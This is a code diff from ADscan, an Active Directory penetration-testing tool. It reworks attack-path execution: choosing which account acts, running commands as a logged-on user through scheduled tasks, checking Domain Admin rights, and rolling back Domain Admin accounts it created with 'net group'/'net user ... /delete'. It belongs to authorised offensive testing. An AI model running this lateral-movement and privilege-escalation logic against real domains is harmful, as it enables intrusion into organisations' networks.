-        if _is_valid_domain_username(user) and not str(user).endswith("$")
-    ]
-    return sorted(set(valid_members), key=str.lower)
+        group_name = _extract_group_name_from_label(principal_label)
+        directory_members = (
+            resolve_group_user_members(
+                shell, domain, group_name, enabled_only=True, max_results=500
+            )
+            if group_name
+            else None
+        )
+        members = {
+            _normalize_account(str(member))
+            for member in (directory_members or [])
+            if str(member or "").strip()
+        }
+    return sorted({m for m in members if m}, key=str.lower)
 
 
 # Priority among the session-granting access relations when several prior steps
@@ -7168,7 +8254,7 @@ def _collect_previous_host_access_candidates(
     target_host_clean = str(target_host or "").strip().lower()
     if not target_host_clean:
         return []
-    best: dict[str, tuple[tuple[int, int, int], str]] = {}
+    best: dict[str, tuple[tuple[int, int, int, int], str]] = {}
 
     for index in range(current_step_index - 1, -1, -1):
         step = steps[index]
@@ -7204,6 +8290,17 @@ def _collect_previous_host_access_candidates(
             domain=domain,
             principal_label=from_label,
         )
+        # The principal that PROVED a successful access step is recorded on it
+        # (the status writer stores ``username``). It is the most specific
+        # evidence of who holds the session, so it leads; the source label's
+        # resolution (a group's owned members) stays as the fallback.
+        proven_actor = (
+            _normalize_account(str(details.get("username") or ""))
+            if step_status == "success"
+            else ""
+        )
+        if proven_actor and proven_actor not in users:
+            users = [proven_actor, *users]
         if not users:
             continue
         status_rank = 0 if step_status == "success" else 1
@@ -7211,6 +8308,7 @@ def _collect_previous_host_access_candidates(
         relation_rank = _ACCESS_RELATION_PRIORITY.get(action, 9)
         reason = f"{action}:{step_status}"
         for user in users:
+            actor_rank = 0 if user == proven_actor else 1
             password = _resolve_exec_password_for_user(
                 shell,
                 domain=domain,
@@ -7221,7 +8319,7 @@ def _collect_previous_host_access_candidates(
             )
             if not password:
                 continue
-            score = (status_rank, distance, relation_rank)
+            score = (status_rank, distance, relation_rank, actor_rank)
             existing = best.get(user)
             if existing is None or score < existing[0]:
                 best[user] = (score, reason)
@@ -7300,8 +8398,10 @@ def render_manufactured_followup_precondition_warning(
     steps: list[dict[str, Any]] | None,
     step_index: int | None,
     from_label: str,
-) -> None:
+) -> str:
     """Explain why a manufactured follow-up has no acting material, honestly.
+
+    Returns the short reason the caller records on the step.
 
     Replaces the machine-account wording that used to reach the operator here,
     which was not merely unhelpful but misleading: it told them to obtain control
@@ -7335,23 +8435,35 @@ def render_manufactured_followup_precondition_warning(
         f"Cannot run {safe_relation}: it needs {privilege} on {marked_host}, and "
         "no session, scoped ticket or stored credential currently provides one.",
     ]
+    reason = "No session or credential provides the required privilege"
     if primary_index is not None and steps:
         primary = steps[primary_index - 1]
         primary_action = rich_markup_escape(
             str(primary.get("action") or "").strip() or "the access step"
         )
-        lines.append(
-            f"Step #{primary_index} ({primary_action}) is what grants it. Run that "
-            "step first: this step's precondition is the session that step proves, "
-            "not a stored credential for the host, so there is nothing to obtain "
-            "beforehand."
-        )
+        if str(primary.get("status") or "").strip().lower() == "success":
+            # The access WAS proven; what is missing is the account that holds
+            # it. Telling the operator to run the step again would be false.
+            lines.append(
+                f"Step #{primary_index} ({primary_action}) proved that access, but "
+                "no account holding it could be resolved: ADscan could not tell "
+                "which principal its source is, or holds no credential for it."
+            )
+            reason = "The account holding the proven access could not be resolved"
+        else:
+            lines.append(
+                f"Step #{primary_index} ({primary_action}) is what grants it. Run that "
+                "step first: this step's precondition is the session that step proves, "
+                "not a stored credential for the host, so there is nothing to obtain "
+                "beforehand."
+            )
     else:
         lines.append(
             "This step's precondition is a session proven by a preceding access "
             "step in this path, not a stored credential for the host."
         )
     print_warning(" ".join(lines))
+    return reason
 
 
 def carry_forward_foothold_actor(
@@ -7738,6 +8850,25 @@ def _execute_unauthenticated_entry_step(
     return True
 
 
+def _actor_cannot_sign_in(shell: Any, domain: str, username: str, *, rung: str) -> bool:
+    """True when ``username`` is known unable to sign in (disabled or locked out).
+
+    The same SSOT the source-owned candidates are filtered by
+    (``account_usability``), applied to the ladder rungs that pick a single
+    principal without going through :func:`resolve_execution_candidates`.
+    """
+    from adscan_internal.services.account_usability import (  # noqa: PLC0415
+        principal_unusable_reason,
+    )
+
+    reason = principal_unusable_reason(shell, domain, username)
+    if reason:
+        print_info_debug(
+            f"attack_paths: skipping {rung} {mark_sensitive(username, 'user')}: {reason}"
+        )
+    return bool(reason)
+
+
 def resolve_step_execution_actor(
     shell: Any,
     *,
@@ -7846,6 +8977,8 @@ def resolve_step_execution_actor(
         context_username=context_username,
         context_password=context_password,
     )
+    if carried_actor and _actor_cannot_sign_in(shell, domain, carried_actor, rung="carried foothold"):
+        carried_actor = None
     if carried_actor:
         secret, islocal = _resolve_actor_secret(
             shell,
@@ -7870,6 +9003,10 @@ def resolve_step_execution_actor(
         machine_account = resolve_owned_machine_account_for_host(
             shell, domain=domain, host=resolved_host
         )
+        if machine_account and _actor_cannot_sign_in(
+            shell, domain, machine_account, rung="owned machine account"
+        ):
+            machine_account = None
         if machine_account:
             secret, islocal = _resolve_actor_secret(
                 shell,
@@ -7970,33 +9107,6 @@ def resolve_step_execution_actor(
                 )
 
     return None
-
-
-def _select_candidate_executor_user(
-    shell: Any,
-    *,
-    candidates: list[tuple[str, str]],
-) -> str | None:
-    """Prompt operator to select candidate executor user when multiple exist."""
-    if not candidates:
-        return None
-    if len(candidates) == 1 or is_non_interactive(shell):
-        return candidates[0][0]
-    if not hasattr(shell, "_questionary_select"):
-        return candidates[0][0]
-
-    options = [
-        f"{mark_sensitive(user, 'user')}  [{reason}]" for user, reason in candidates
-    ]
-    options.append("Cancel")
-    selected = shell._questionary_select(
-        "Select execution user for HasSession step:",
-        options,
-        default_idx=0,
-    )
-    if selected is None or selected >= len(options) - 1:
-        return None
-    return candidates[selected][0]
 
 
 def _extract_linked_server_from_step(step: dict[str, Any]) -> str | None:
@@ -8189,141 +9299,6 @@ def _run_post_xpcmdshell_success_chain(
             )
         except Exception as revert_exc:  # noqa: BLE001
             telemetry.capture_exception(revert_exc)
-
-
-def _find_previous_adminto_exec_user_for_host(
-    shell: Any,
-    *,
-    domain: str,
-    steps: list[dict[str, Any]],
-    current_step_index: int,
-    target_host: str,
-) -> str | None:
-    """Return the best prior AdminTo source user for the same target host.
-
-    Preference order:
-    1) nearest previous AdminTo with ``status=success`` and stored credential
-    2) nearest previous AdminTo with any status and stored credential
-    """
-    target_host_clean = str(target_host or "").strip().lower()
-    if not target_host_clean:
-        return None
-
-    fallback_user: str | None = None
-    for index in range(current_step_index - 1, -1, -1):
-        step = steps[index]
-        if not isinstance(step, dict):
-            continue
-        action = str(step.get("action") or "").strip().lower()
-        if action != "adminto":
-            continue
-        details = step.get("details") if isinstance(step.get("details"), dict) else {}
-        from_label = str(details.get("from") or "").strip()
-        to_label = str(details.get("to") or "").strip()
-        if not from_label or not to_label:
-            continue
-        resolved_target = resolve_netexec_target_for_node_label(
-            shell, domain, node_label=to_label
-        )
-        if not isinstance(resolved_target, str) or not resolved_target.strip():
-            continue
-        if resolved_target.strip().lower() != target_host_clean:
-            continue
-
-        candidate_user = _normalize_account(from_label)
-        if not _is_valid_domain_username(candidate_user):
-            continue
-        _cand_domain, _cand_kdc, _cand_secret = resolve_execution_source_credential(
-            shell,
-            domain=domain,
-            exec_username=candidate_user,
-            raw_principal_label=from_label,
-            password=_resolve_domain_password(shell, domain, candidate_user),
-        )
-        if not _cand_secret:
-            continue
-
-        step_status = str(step.get("status") or "discovered").strip().lower()
-        if step_status == "success":
-            marked_user = mark_sensitive(candidate_user, "user")
-            marked_host = mark_sensitive(target_host, "hostname")
-            print_info_debug(
-                "[hassession] Selected executor from previous successful AdminTo: "
-                f"{marked_user} -> {marked_host}"
-            )
-            return candidate_user
-        if fallback_user is None:
-            fallback_user = candidate_user
-
-    if fallback_user:
-        marked_user = mark_sensitive(fallback_user, "user")
-        marked_host = mark_sensitive(target_host, "hostname")
-        print_info_debug(
-            "[hassession] Selected executor from previous AdminTo candidate: "
-            f"{marked_user} -> {marked_host}"
-        )
-    return fallback_user
-
-
-def _resolve_hassession_execution_user(
-    shell: Any,
-    *,
-    domain: str,
-    summary: dict[str, Any],
-    steps: list[dict[str, Any]],
-    current_step_index: int,
-    target_host: str,
-    from_label: str,
-    context_username: str | None,
-    context_password: str | None,
-) -> tuple[str | None, str | None, str]:
-    """Resolve executor credential context for HasSession exploitation."""
-    candidates = _collect_previous_host_access_candidates(
-        shell,
-        domain=domain,
-        steps=steps,
-        current_step_index=current_step_index,
-        target_host=target_host,
-        context_username=context_username,
-        context_password=context_password,
-    )
-    if candidates:
-        selected_user = _select_candidate_executor_user(shell, candidates=candidates)
-        if not selected_user:
-            return None, None, "cancelled"
-        password = _resolve_exec_password_for_user(
-            shell,
-            domain=domain,
-            username=selected_user,
-            context_username=context_username,
-            context_password=context_password,
-        )
-        if password:
-            reason_map = {user: reason for user, reason in candidates}
-            return (
-                selected_user,
-                password,
-                reason_map.get(selected_user, "previous_host_access"),
-            )
-
-    exec_username = _resolve_execution_user(
-        shell,
-        domain=domain,
-        context_username=context_username,
-        summary=summary,
-        from_label=from_label,
-    )
-    if not exec_username:
-        return None, None, "unresolved"
-    password = _resolve_exec_password_for_user(
-        shell,
-        domain=domain,
-        username=exec_username,
-        context_username=context_username,
-        context_password=context_password,
-        raw_principal_label=from_label,
-    )
-    return exec_username, password, "generic_context"
 
 
 def _resolve_domain_admin_group_candidates(shell: Any, domain: str) -> list[str]:
@@ -8679,39 +9654,115 @@ def _run_hassession_rollback(
     return (not _group_hard_fail, deleted)
 
 
-def _settle_hassession_ledger_records(
+#: ``RevertCandidate.kind`` of the HasSession step's own channel: a command run
+#: in the logged-on session through a scheduled task, not a credential bind.
+_HASSESSION_CHANNEL_KIND = "hassession_session_channel"
+
+
+def _revert_hassession_changes(
     shell: Any,
     *,
     domain: str,
     target_user: str,
+    target_password: str | None,
     exec_username: str,
     exec_password: str,
     is_dc_target: bool,
     target_host: str,
     session_user: str,
+    group_candidates: list[str],
+    user_created_by_us: bool,
     user_change_id: str | None,
     group_change_id: str | None,
-    group_reverted: bool,
-    account_reverted: bool,
     selected_group: str | None,
-) -> None:
-    """Settle the HasSession DA-account ledger records against the rollback.
+    membership_verified: bool = False,
+) -> tuple[bool, bool]:
+    """Undo the HasSession account and group membership through the shared precedence.
 
-    ``reverted_confirmed`` is the only good terminal and it is fail-closed: it
-    requires BOTH the rollback reporting it undid the change AND a confirming
-    re-read proving the principal is no longer a Domain Admin (a deleted account
-    cannot be one). A re-read that is inconclusive or still shows membership
-    keeps the record manual_required with the native remediation naming the
-    account, so the client cleanup checklist never loses a DA account ADscan
-    could not prove it removed. Best-effort: never raises into the step flow.
+    Each change is reverted by the client cleanup account, then a verified
+    privileged credential, then the step's own material (the logged-on
+    session the step used, then the account it minted), then the account that
+    ran the step, every attempt recorded on its ledger entry. Native transports
+    for a credential (LDAP for a domain group or account, SAMR on the host for
+    a local one); the session is reached through the same scheduled task the
+    step used, and its undo is confirmed by a read-only re-read as the
+    executing account. Only a confirming re-read settles ``reverted_confirmed``;
+    otherwise the record is ``manual_required`` with the native command.
+
+    Returns:
+        ``(group_reverted, account_reverted)``; a value is True when there was
+        nothing of that kind to revert.
     """
-    ledger = getattr(shell, "environment_change_ledger", None)
-    if ledger is None or (user_change_id is None and group_change_id is None):
-        return
     from adscan_internal.services import cleanup_taxonomy as _hs_tax  # noqa: PLC0415
+    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
+        VERIFY_ACCOUNT_DELETED,
+        VERIFY_GROUP_MEMBERSHIP,
+    )
+    from adscan_internal.services.native_account_cleanup import (  # noqa: PLC0415
+        account_absent_as_candidate,
+        delete_account_as_candidate,
+        remove_group_member_as_candidate,
+        remove_local_admin_member_as_candidate,
+        resolve_domain_dc,
+    )
+    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
+        KIND_PASSWORD,
+        ROLE_CREATOR,
+        ROLE_SESSION,
+        ROLE_TARGET_TICKET,
+        RevertCandidate,
+        run_revert_with_precedence,
+    )
 
-    membership_gone = False
-    try:
+    ledger = ledger_or_warn(shell)
+    scope = "domain" if is_dc_target else "local"
+    domain_flag = " /domain" if is_dc_target else ""
+    group_verb = "group" if is_dc_target else "localgroup"
+    group_name = selected_group or ("Domain Admins" if is_dc_target else "Administrators")
+    dc_ip, dc_fqdn = resolve_domain_dc(shell, domain)
+    marked_user = mark_sensitive(target_user, "user")
+
+    # The read-only re-read after a session-channel undo runs as the executing
+    # account (any domain account reads the directory; a local admin reads SAM).
+    reader = RevertCandidate(
+        role=ROLE_CREATOR, username=exec_username, domain=domain, secret=exec_password
+    )
+
+    def _channel(command: str, log_suffix: str) -> tuple[bool, str]:
+        return _run_hassession_schtask_command(
+            shell,
+            domain=domain,
+            exec_username=exec_username,
+            exec_password=exec_password,
+            target_host=target_host,
+            session_user=session_user,
+            command_to_run=command,
+            log_suffix=log_suffix,
+        )
+
+    extras: list[Any] = [
+        RevertCandidate(
+            role=ROLE_TARGET_TICKET,
+            username=session_user,
+            domain=domain,
+            secret=exec_password,
+            kind=_HASSESSION_CHANNEL_KIND,
+        )
+    ]
+    # The minted Domain Admin can undo its own membership and account over LDAP.
+    # A minted LOCAL account authenticates to its host only, never to the domain.
+    if is_dc_target and user_created_by_us and target_password:
+        extras.append(
+            RevertCandidate(
+                role=ROLE_SESSION,
+                username=target_user,
+                domain=domain,
+                secret=target_password,
+                kind=KIND_PASSWORD,
+            )
+        )
+
+    def _membership_gone() -> bool:
         if is_dc_target:
             membership = _is_user_domain_admin_via_sid(
                 shell,
@@ -8730,60 +9781,145 @@ def _settle_hassession_ledger_records(
                 session_user=session_user,
                 target_user=target_user,
             )
-        # Only a definitive False (no longer a member) confirms removal; None is
-        # an inconclusive probe and must NOT be read as "gone" (fail-closed).
-        membership_gone = membership is False
-    except Exception as exc:  # noqa: BLE001
-        telemetry.capture_exception(exc)
-        membership_gone = False
+        # Only a definitive False confirms; None is inconclusive (fail-closed).
+        return membership is False
 
-    group_name = selected_group or ("Domain Admins" if is_dc_target else "Administrators")
-
-    if group_change_id is not None:
-        try:
-            if group_reverted and membership_gone:
-                ledger.mark_reverted_confirmed(
-                    group_change_id,
-                    verification_method="hassession_membership_reread",
-                    min_credential_principal=exec_username,
+    def _group_attempt(candidate: Any) -> tuple[bool, str | None]:
+        if candidate.kind == _HASSESSION_CHANNEL_KIND:
+            for name in group_candidates or [group_name]:
+                _channel(
+                    f'net {group_verb} "{name}" "{target_user}" /delete{domain_flag}',
+                    f"rollback_rmgrp_{_sanitize_filename_token(name, fallback='group')}",
                 )
+            if _membership_gone():
+                return True, None
+            return False, "the re-read still shows the membership"
+        if is_dc_target:
+            return remove_group_member_as_candidate(
+                shell,
+                candidate,
+                domain=domain,
+                group=group_name,
+                member=target_user,
+                pdc_host=dc_fqdn or dc_ip,
+            )
+        return remove_local_admin_member_as_candidate(
+            candidate, host=target_host, username=target_user, kdc_ip=dc_ip or None
+        )
+
+    def _account_attempt(candidate: Any) -> tuple[bool, str | None]:
+        if candidate.kind == _HASSESSION_CHANNEL_KIND:
+            _channel(f'net user "{target_user}" /delete{domain_flag}', "rollback_delusr")
+            if account_absent_as_candidate(
+                shell,
+                reader,
+                domain=domain,
+                host=target_host,
+                username=target_user,
+                scope=scope,
+                kdc_ip=dc_ip or None,
+            ):
+                return True, None
+            return False, "the re-read still finds the account"
+        return delete_account_as_candidate(
+            shell,
+            candidate,
+            domain=domain,
+            host=target_host,
+            username=target_user,
+            scope=scope,
+            kdc_ip=dc_ip or None,
+        )
+
+    group_reverted = True
+    if group_change_id is not None or not user_created_by_us:
+        print_info(f"[rollback] Removing {marked_user} from '{group_name}'...")
+        group_result = run_revert_with_precedence(
+            shell,
+            ledger=ledger if group_change_id else None,
+            change_id=group_change_id,
+            domain=domain,
+            purpose="group_membership_added",
+            revert_and_confirm=_group_attempt,
+            verification_method=VERIFY_GROUP_MEMBERSHIP,
+            manual_instructions=_hs_tax.MANUAL_GROUP_MEMBERSHIP.replace(
+                "GROUP", group_name
+            ).replace("MEMBER", target_user),
+            object_dn=target_user,
+            creator_username=exec_username,
+            creator_secret=exec_password,
+            creator_domain=domain,
+            extra_before_creator=extras,
+            description="HasSession group membership removal",
+        )
+        group_reverted = group_result.confirmed
+
+    account_reverted = True
+    if user_created_by_us:
+        print_info(f"[rollback] Deleting the account {marked_user} ADscan created...")
+        account_result = run_revert_with_precedence(
+            shell,
+            ledger=ledger if user_change_id else None,
+            change_id=user_change_id,
+            domain=domain,
+            purpose="user_created",
+            revert_and_confirm=_account_attempt,
+            verification_method=VERIFY_ACCOUNT_DELETED,
+            manual_instructions=_hs_tax.MANUAL_USER_ACCOUNT.replace("TARGET", target_user),
+            object_dn=target_user,
+            creator_username=exec_username,
+            creator_secret=exec_password,
+            creator_domain=domain,
+            extra_before_creator=extras,
+            description="HasSession account deletion",
+        )
+        account_reverted = account_result.confirmed
+
+    # Keep the runtime membership snapshot symmetric with the add: only a
+    # VERIFIED membership of an account ADscan created was recorded, so only
+    # that one is annotated back. A failed escalation recorded nothing, and
+    # writing a cleanup ``AdminTo`` status for it would assert an access that
+    # never existed.
+    if user_created_by_us and group_reverted and membership_verified:
+        try:
+            if is_dc_target:
+                from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                    remove_runtime_user_group_membership,
+                )
+
+                for name in group_candidates or [group_name]:
+                    remove_runtime_user_group_membership(
+                        shell,
+                        domain,
+                        username=target_user,
+                        group_name=name,
+                        source="hassession_attack_step",
+                        origin_relation="AddMember",
+                    )
             else:
-                ledger.mark_manual_required(
-                    group_change_id,
-                    reason=_hs_tax.MANUAL_REASON_REVERT_FAILED,
-                    remediation_command=_hs_tax.MANUAL_GROUP_MEMBERSHIP.replace(
-                        "GROUP", group_name
-                    ).replace("MEMBER", target_user),
-                    remediation_object_dn=target_user,
-                    error="HasSession group-membership removal could not be confirmed.",
+                update_edge_status_by_labels(
+                    shell,
+                    domain,
+                    from_label=target_user,
+                    relation="AdminTo",
+                    to_label=target_host,
+                    status="success",
+                    notes={
+                        "cleanup_pending": False,
+                        "cleanup_status": "success",
+                        "cleanup_kind": "hassession_account_deleted",
+                    },
                 )
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
             print_exception(exception=exc)
 
-    if user_change_id is not None:
-        try:
-            # A deleted account cannot still be a Domain Admin, so the membership
-            # re-read doubles as the confirming read for the account removal.
-            if account_reverted and membership_gone:
-                ledger.mark_reverted_confirmed(
-                    user_change_id,
-                    verification_method="hassession_account_delete_reread",
-                    min_credential_principal=exec_username,
-                )
-            else:
-                ledger.mark_manual_required(
-                    user_change_id,
-                    reason=_hs_tax.MANUAL_REASON_REVERT_FAILED,
-                    remediation_command=_hs_tax.MANUAL_USER_ACCOUNT.replace(
-                        "TARGET", target_user
-                    ),
-                    remediation_object_dn=target_user,
-                    error="HasSession account deletion could not be confirmed.",
-                )
-        except Exception as exc:  # noqa: BLE001
-            telemetry.capture_exception(exc)
-            print_exception(exception=exc)
+    if not (group_reverted and account_reverted):
+        print_warning(
+            f"[rollback] Could not confirm the cleanup of {marked_user}; it is listed "
+            "in the environment-change ledger for manual cleanup."
+        )
+    return group_reverted, account_reverted
 
 
 def _check_hassession_pending_cleanup(shell: Any, *, domain: str) -> None:
@@ -8933,6 +10069,284 @@ def _is_user_local_admin_via_net(
             f"{marked_user}@{marked_host}: {exc}"
         )
         return None
+
+
+def _hassession_refusal_reason(prefix: str, output: str) -> str:
+    """One client-readable clause for a session command the host refused.
+
+    ``net`` reports a refusal on two lines ("System error 5 has occurred." then
+    "Access is denied."); keep the first two non-empty lines so the cause reads
+    whole. The output is the target's own text, never a secret ADscan holds.
+    """
+    lines = [ln.strip() for ln in str(output or "").splitlines() if ln.strip()]
+    detail = " ".join(lines[:2]).strip()
+    if len(detail) > 200:
+        detail = detail[:197] + "..."
+    return f"{prefix} ({detail})" if detail else f"{prefix} (no output was returned)"
+
+
+#: ``notes["outcome"]`` of a ScheduledTask step that proved the session usable as
+#: the logged-on user without writing anything (branch 2 of the rights ladder).
+SCHEDULEDTASK_SESSION_IDENTITY_OUTCOME = SESSION_IDENTITY_OUTCOME
+
+
+def _session_identity_proven(output: str, session_user: str) -> bool:
+    """True when ``whoami`` output names ``session_user`` (``DOMAIN\\user``)."""
+    wanted = str(session_user or "").strip().lower()
+    if not wanted:
+        return False
+    for line in str(output or "").splitlines():
+        token = line.strip().lower()
+        if token and token.rsplit("\\", 1)[-1] == wanted:
+            return True
+    return False
+
+
+def _run_scheduledtask_identity_handoff(
+    shell: Any,
+    *,
+    domain: str,
+    action: str,
+    from_label: str,
+    to_label: str,
+    target_host: str,
+    session_user: str,
+    exec_username: str,
+    exec_password: str,
+    exec_context_source: str,
+    non_interactive: bool,
+    active_step_context: Callable[..., Any],
+) -> bool | None:
+    """Prove the session is usable as ``session_user`` and record it; write nothing.
+
+    Branch 2 of the ScheduledTask rights ladder: the session user does not
+    administer the domain, so no account is created (the host or the domain
+    would refuse it, and a local administrator account would add nothing the
+    executor does not already hold). The step runs one read-only command,
+    ``whoami``, through the session and records an identity hand-off when the
+    output names the session user: ADscan ran code as that user, and no account
+    was created. Nothing enters the change ledger.
+
+    Returns True (hand-off proven), False (the command did not run as that
+    user), or None (the operator aborted at the AV/EDR gate; nothing ran).
+    """
+    if (
+        _hassession_av_edr_gate(
+            shell,
+            domain=domain,
+            target_host=target_host,
+            target_user=session_user,
+            session_user=session_user,
+            exec_username=exec_username,
+            exec_password=exec_password,
+            non_interactive=non_interactive,
+        )
+        == "abort"
+    ):
+        return None
+    base_notes = {
+        "username": exec_username,
+        "target_host": target_host,
+        "session_user": session_user,
+        "acting_principal_samaccountname": session_user,
+        "mode": "session_identity",
+        "exec_context_source": exec_context_source,
+    }
+    with active_step_context(
+        action=action, from_label=from_label, to_label=to_label, notes=base_notes
+    ):
+        try:
+            update_edge_status_by_labels(
+                shell,
+                domain,
+                from_label=from_label,
+                relation=action,
+                to_label=to_label,
+                status="attempted",
+                notes=base_notes,
+            )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+        ok, output = _run_hassession_schtask_command(
+            shell,
+            domain=domain,
+            exec_username=exec_username,
+            exec_password=exec_password,
+            target_host=target_host,
+            session_user=session_user,
+            command_to_run="whoami",
+            log_suffix="session_identity",
+        )
+        proven = bool(ok) and _session_identity_proven(output, session_user)
+        if proven:
+            summary = (
+                f"ADscan ran a command as {session_user} on {target_host} through "
+                f"the logged-on session. {session_user} does not administer the "
+                "domain, so no account was created."
+            )
+            notes = {
+                **base_notes,
+                "outcome": SCHEDULEDTASK_SESSION_IDENTITY_OUTCOME,
+                "summary": summary,
+                OUTCOME_NOTE_KEY: summary,
+            }
+            status = "success"
+        else:
+            summary = _hassession_refusal_reason(
+                f"The command run through the session did not run as {session_user}",
+                output,
+            )
+            notes = {**base_notes, "reason": summary, OUTCOME_NOTE_KEY: summary}
+            status = "failed"
+        try:
+            update_edge_status_by_labels(
+                shell,
+                domain,
+                from_label=from_label,
+                relation=action,
+                to_label=to_label,
+                status=status,
+                notes=notes,
+            )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+    marked = mark_sensitive(rich_markup_escape(summary), "detail")
+    if proven:
+        print_success(f"ScheduledTask: {marked}")
+    else:
+        print_warning(f"ScheduledTask: {marked}.")
+    return proven
+
+
+def _session_user_administers_domain(
+    shell: Any,
+    *,
+    domain: str,
+    session_user: str,
+    auth_username: str,
+    auth_password: str,
+) -> bool | None:
+    """Whether the session user administers the domain: True, False or unknown.
+
+    The HasSession follow-up runs its commands AS the session user, so that
+    user's rights decide what the step may write, never the role of the host
+    the session lives on. Administering the domain means membership, direct or
+    transitive, of Domain Admins, Enterprise Admins or the domain's
+    BUILTIN\\Administrators (``S-1-5-32-544``), decided on group SIDs, never on
+    names (they are localized).
+
+    Three sources, each read by group SID, and a positive in ANY of them is the
+    answer (the 14.0.0 Audit row decided "does not administer" for a user the
+    directory lists as a DIRECT member of ``S-1-5-32-544``, because a single
+    ``member``-in-chain read returned three groups without it):
+
+    1. the membership SSOT (``resolve_principal_groups``: the transitive
+       ``memberships.json`` closure, primary group and builtin groups included);
+    2. the live ``tokenGroups`` of the user object, read from a DC of the domain
+       (it includes domain-local and builtin groups and the primary group);
+    3. the live ``member``-in-chain read.
+
+    False when at least one source answered and none is positive; None (the
+    caller writes nothing and says why) only when every source failed.
+    """
+    from adscan_internal.services.privileged_group_classifier import (  # noqa: PLC0415
+        classify_privileged_membership_from_group_sids,
+    )
+
+    def _administers(group_sids: list[str]) -> bool:
+        membership = classify_privileged_membership_from_group_sids(group_sids)
+        return bool(
+            membership.domain_admin
+            or membership.enterprise_admins
+            or membership.administrators
+        )
+
+    marked_user = mark_sensitive(session_user, "user")
+    answered = False
+
+    def _verdict(source: str, sids: list[str] | None) -> bool:
+        nonlocal answered
+        if sids is None:
+            print_info_debug(
+                f"[scheduledtask] rights of {marked_user}: {source} unavailable"
+            )
+            return False
+        answered = True
+        positive = _administers(list(sids))
+        print_info_debug(
+            f"[scheduledtask] rights of {marked_user}: {source} SIDs={len(sids)} "
+            f"administers_domain={positive}"
+        )
+        return positive
+
+    snapshot_sids: list[str] | None = None
+    try:
+        from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
+            resolve_principal_groups,
+        )
+
+        resolved = resolve_principal_groups(shell, domain, session_user)
+        if str(resolved.get("source") or "") not in {"", "none"}:
+            found = [str(sid) for sid in (resolved.get("group_sids") or []) if sid]
+            # Groups resolved without any SID cannot be decided by SID.
+            snapshot_sids = found if (found or not resolved.get("groups")) else None
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    if _verdict("membership closure", snapshot_sids):
+        return True
+
+    from adscan_internal.cli.ldap import (  # noqa: PLC0415
+        get_principal_token_group_sids,
+        get_recursive_principal_group_sids_in_chain,
+    )
+
+    token_sids: list[str] | None = None
+    try:
+        token_sids = get_principal_token_group_sids(
+            shell,
+            domain=domain,
+            target_samaccountname=session_user,
+            auth_username=auth_username,
+            auth_password=auth_password,
+            prefer_kerberos=True,
+            allow_ntlm_fallback=True,
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    if _verdict("live tokenGroups", token_sids):
+        return True
+
+    chain_sids: list[str] | None = None
+    try:
+        chain_sids = get_recursive_principal_group_sids_in_chain(
+            shell,
+            domain=domain,
+            target_samaccountname=session_user,
+            auth_username=auth_username,
+            auth_password=auth_password,
+            # One read: an empty answer is a real answer here (a standard user
+            # with only the implicit primary group), not a replication lag.
+            retries=1,
+            retry_on_empty=False,
+            prefer_kerberos=True,
+            allow_ntlm_fallback=True,
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    if _verdict("live member-in-chain", chain_sids):
+        return True
+
+    if answered:
+        return False
+    print_info_debug(
+        f"[scheduledtask] rights of {marked_user} undetermined: no source answered"
+    )
+    return None
 
 
 def _is_user_domain_admin_via_sid(
@@ -9140,7 +10554,7 @@ def _attempt_post_adminto_credential_harvest(
         return
 
     golden_exec_user = _normalize_account(golden_from_label)
-    if not golden_exec_user.endswith("$"):
+    if str(_resolve_from_node_kind(shell, domain, golden_from_label) or "").lower() != "computer":
         return
 
     if _resolve_domain_password(shell, domain, golden_exec_user):
@@ -9784,15 +11198,24 @@ def execute_selected_attack_path(
     context_username: str | None = None,
     context_password: str | None = None,
     search_mode_label: str | None = None,
+    execution_mode: str | None = None,
+    run_id: str | None = None,
 ) -> bool:
-    """Execute a selected attack path (best-effort).
+    """Execute a selected attack path as one recorded run.
 
-    Currently supported step mappings:
-    - AllowedToDelegate -> `exploit_delegation_constrained` (native S4U via kerbad)
+    Opens an :class:`AttackPathExecutionRun` around the execution so the
+    operator (CLI and web) gets the plan, a per-step outcome and one result
+    summary on every exit path. ``execution_mode`` is ``continuous`` (default)
+    or ``step`` (confirm before each executable step); a run with no operator
+    and no remote bridge always runs continuously and never blocks.
 
     Returns:
         True if an execution attempt was started, False otherwise.
     """
+    from adscan_internal.interactive_requests import (  # noqa: PLC0415
+        is_remote_interaction_enabled,
+    )
+
     # --- Collapsed sibling-pivot selection ---
     # When the selected path is a collapsed fan-out (N interchangeable pivot
     # accounts reaching the same downstream path), let the operator CHOOSE which
@@ -9827,6 +11250,70 @@ def execute_selected_attack_path(
                 )
     # --- End collapsed sibling-pivot selection ---
 
+    # A nested execution (a follow-up that executes another path while a run is
+    # open) reports into the run already open; it does not start a second one.
+    if get_active_execution_run(shell) is not None:
+        return _execute_selected_attack_path_impl(
+            shell,
+            domain,
+            summary=summary,
+            context_username=context_username,
+            context_password=context_password,
+            search_mode_label=search_mode_label,
+        )
+
+    mode = execution_mode or resolve_default_execution_mode(shell)
+    if (
+        mode == MODE_STEP
+        and is_non_interactive(shell)
+        and not is_remote_interaction_enabled()
+    ):
+        print_info_debug(
+            "attack_paths step mode downgraded to continuous: no operator and no remote bridge"
+        )
+        mode = MODE_CONTINUOUS
+    run = AttackPathExecutionRun(shell, domain=domain, summary=summary, run_id=run_id, mode=mode)
+    install_execution_run(shell, run)
+    try:
+        run.start()
+        return _execute_selected_attack_path_impl(
+            shell,
+            domain,
+            summary=summary,
+            context_username=context_username,
+            context_password=context_password,
+            search_mode_label=search_mode_label,
+        )
+    except BaseException as exc:
+        run.record_error(exc)
+        raise
+    finally:
+        install_execution_run(shell, None)
+        try:
+            run.finish()
+        except Exception as exc:  # noqa: BLE001 - the summary must never mask the run
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+
+
+def _execute_selected_attack_path_impl(
